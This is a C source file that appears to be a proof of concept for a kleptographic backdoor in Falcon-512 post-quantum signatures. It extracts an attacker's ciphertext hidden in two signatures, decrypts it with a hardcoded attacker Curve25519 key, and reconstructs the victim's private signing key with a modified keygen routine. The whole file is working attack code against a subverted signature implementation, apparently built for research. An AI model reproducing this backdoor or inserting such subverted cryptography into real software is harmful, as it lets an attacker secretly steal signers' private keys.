#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <oqs/sig_falcon.h>
#include <oqs/rand.h>

#include "cecies/decrypt.h"
#include "cecies/types.h"

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

#define SEEDLEN       48
#define MESSAGELEN    50
#define INFOATTACK    80


// Info saved from the signatures
uint8_t ct_attack[INFOATTACK];
// Bytes already saved from the signatures
int start_attack = 0;


void print_array(uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}


// Decrypt info in ct_attack
void attacker_decrypt(uint8_t** plaintext_dec) {
    size_t plaintext_len;

    cecies_curve25519_key private_key = {.hexstring = "48bddcca7d36729e0f54acedf7016b14c72423749757fc80d90d9017fea3cbc0"};

    if (cecies_curve25519_decrypt(ct_attack, INFOATTACK, 0, private_key, plaintext_dec, &plaintext_len)) {
        printf("cecies_curve25519_decrypt failed\n");
        exit(EXIT_FAILURE);
    }
}


// Recover the private key from the attacked party
int main() {
    uint8_t *pk, *sk, *generated_sk;
    uint8_t *sig, *message, *plaintext_dec;
    size_t siglen;
    int ret;

    pk = malloc(OQS_SIG_falcon_512_length_public_key);
    sk = malloc(OQS_SIG_falcon_512_length_secret_key);
    generated_sk = malloc(OQS_SIG_falcon_512_length_secret_key);
    message = malloc(MESSAGELEN);
    plaintext_dec = malloc(32);
    sig = malloc(OQS_SIG_falcon_512_length_signature);
    OQS_randombytes(message, MESSAGELEN); // message is not relevant


    printf("\nGenerating the victim's keypair...\n");

    ret = PQCLEAN_FALCON512_CLEAN_crypto_sign_keypair(pk, sk);
    if (ret != 0) {
        printf("ERROR: PQCLEAN_FALCON512_CLEAN_crypto_sign_keypair failed\n");
    }

    // printf("\nVictim's public key:\n\n");
    // print_array(pk, OQS_SIG_falcon_512_length_public_key);
    printf("\nVictim's private key:\n\n");
    print_array(sk, OQS_SIG_falcon_512_length_secret_key);

    // printf("\nMessage to be signed by the victim:\n\n");
    // print_array(message, MESSAGELEN);

    // 2 signatures to get the 80 bytes of the ciphertext
    for (int i = 0; i < 2; ++i) {

        ret = PQCLEAN_FALCON512_CLEAN_crypto_sign_signature(sig, &siglen, message, MESSAGELEN, sk);
        if (ret != 0) {
            printf("ERROR: PQCLEAN_FALCON512_CLEAN_crypto_sign failed\n");
        }

        printf("\nSignature:\n\n");
        // print_array(sig, siglen);
        
        printf("%02x", sig[0]);
        
        if (start_attack)  // Para mudar a cor em cada assinatura
            printf(ANSI_COLOR_CYAN);
        else 
            printf(ANSI_COLOR_YELLOW);
            
        for (int i = 1; i < 40; i++) {
            printf("%02x", sig[i]);
        }
        printf(ANSI_COLOR_RESET);
        
        for (int i = 40; i < siglen; i++) {
            printf("%02x", sig[i]);
        }
        printf("\n");
        

        ret = PQCLEAN_FALCON512_CLEAN_crypto_sign_verify(sig, siglen, message, MESSAGELEN, pk);
        if (ret != 0) {
            printf("ERROR: PQCLEAN_FALCON512_CLEAN_crypto_sign_verify failed\n");
        }

        // The ciphertext begins in the second byte of the signature
        for (int a = 0, s = start_attack; a < 40; a++) {
            ct_attack[a+s] = sig[a+1];
        }

        printf("\nAttacker's ciphertext recovered from the signature:\n\n");
        // print_array(ct_attack, (size_t) start_attack + 40);

        for (int i = 0; i < start_attack; i++) {
            printf("%02x", ct_attack[i]);
        }

        if (start_attack)  // Para mudar a cor em cada assinatura
            printf(ANSI_COLOR_CYAN);
        else 
            printf(ANSI_COLOR_YELLOW);

        for (int i = start_attack; i < start_attack + 40; i++) {
            printf("%02x", ct_attack[i]);
        }
        printf(ANSI_COLOR_RESET "\n");
        

        // Verificar se este é o primeiro ciphertext ou o segundo
        // Binário: 1000 0000 é 0x80 em hexadecimal
        // if (sig[0+1] < 0x80) {
        //   printf("Este é o primeiro ciphertext\n");
        // } else {
        //   printf("Este é o segundo ciphertext\n");
        // }
        start_attack += 40;

    }

    printf("\nThe attacker has sucessfully recovered the hidden ciphertext from the signatures.\n");

    printf("\nDecrypting the ciphertext...\n");

    // Construct the private key from the ciphertext
    attacker_decrypt(&plaintext_dec);

    printf("\nCiphertext decrypted. Computing victim's private key...\n");

    ret = PQCLEAN_FALCON512_CLEAN_crypto_sign_keypair_attack(generated_sk, plaintext_dec);
    if (ret != 0) {
        printf("ERROR: PQCLEAN_FALCON512_CLEAN_crypto_sign_keypair_attack failed\n");
    }

    printf("\nVictim's private key recovered:\n\n");
    print_array(generated_sk, OQS_SIG_falcon_512_length_secret_key);

    // Check if the generated private key is equal to the real private key
    for (int i = 0; i < OQS_SIG_falcon_512_length_secret_key; ++i) {
        if (generated_sk[i] != sk[i]) {
            printf("wrong sk in index %d\n", i);
        }
    }

    free(pk);
    free(sk);
    free(generated_sk);
    free(message);
    free(plaintext_dec);
    free(sig);

    return 0;
}
